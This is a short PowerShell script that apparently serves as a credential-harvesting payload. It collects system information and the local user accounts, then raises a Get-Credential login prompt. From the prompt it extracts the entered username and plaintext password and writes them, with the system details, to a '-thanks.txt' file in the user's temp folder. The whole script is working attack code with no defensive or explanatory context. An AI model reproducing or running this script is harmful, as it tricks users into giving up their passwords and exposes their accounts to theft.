#System info
$SysInfo = Get-CimInstance CIM_ComputerSystem | Out-String

#Local Users
$LUser = Get-WmiObject -Class Win32_UserAccount | Format-Table Domain, Name, @{N='Account';E={$PSItem.Caption}}, FullName, SID | Out-String

########################################################################################################################################################################

function creds {

$creds = Get-Credential

$creds.username

$creds.Password | ConvertFrom-SecureString

$creds.GetNetworkCredential().username

$creds.GetNetworkCredential().password

}

$creds = creds

########################################################################################################################################################################

$output = @"

System Info:
$SysInfo

Local Users:
$LUser

User and Password:

$creds
"@

$output >> $env:tmp\$env:USERNAME-thanks.txt

